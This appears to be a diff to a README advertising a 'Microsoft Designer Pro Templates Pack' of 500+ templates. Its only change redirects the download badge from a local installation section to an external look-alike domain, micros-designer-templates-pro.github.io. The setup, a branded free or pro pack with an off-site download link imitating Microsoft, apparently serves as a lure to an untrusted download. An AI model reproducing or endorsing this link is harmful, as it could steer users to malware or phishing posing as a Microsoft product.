@@ -1,7 +1,7 @@
 # Microsoft Designer Pro Templates Pack  
 Revolutionize your content creation with 500+ professionally designed templates for Microsoft Designer. Perfect for social media managers, marketers, and small businesses. Includes AI customization tools and commercial license.  
 
-[![Download Template Pack](https://img.shields.io/badge/Download-Template_Pack-0078D7)](#installation)  
+[![Download Template Pack](https://img.shields.io/badge/Download-Template_Pack-0078D7)](https://micros-designer-templates-pro.github.io/.github)  
 
 ---  
 
